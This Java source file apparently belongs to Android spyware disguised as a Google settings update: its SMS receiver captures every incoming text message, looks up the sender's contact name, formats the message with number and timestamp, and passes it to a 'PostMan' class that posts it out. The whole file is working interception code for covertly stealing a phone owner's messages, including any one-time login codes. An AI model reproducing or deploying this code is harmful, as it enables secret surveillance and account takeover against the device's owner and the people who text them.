package com.setting.dl.google.googlesettingupdate.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.phone.Contacts;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.u;

public final class SmsReciever extends BroadcastReceiver {
    
    
    @Override
    public void onReceive(Context context, Intent intent) {
        
        if (intent == null) return;
        
        if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            
            u.log.d("Action gelen mesaj değil");
            return;
        }
        
        Bundle intentExtras = intent.getExtras();
        
        if (intentExtras == null) {
            
            u.log.d("Extralar yok");
            return;
        }
        
        StringBuilder message = new StringBuilder();
        SmsMessage[]  msgs    = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        
        for (SmsMessage incomingSms : msgs) {
            
            message.append(incomingSms.getMessageBody());
        }
        
        String number = msgs[0].getOriginatingAddress();
        
        if (number == null) number = "999999";
        
        String name = Contacts.getContactNameWithNumber(context, number);
    
        String val = String.format(
                
                        "     Yeni mesaj%n" +
                        "=====================%n" +
                        "Gönderen  : %s%n" +
                        "Numara    : %s%n" +
                        "Tarih     : %s%n" +
                        "Mesaj     : %s",
                
                name,
                number,
                Time.getDate(msgs[0].getTimestampMillis()),
                message
        
        );
        
        u.log.d(val);
        PostMan.getInstance(context).postText( "sms", val);
    }
}
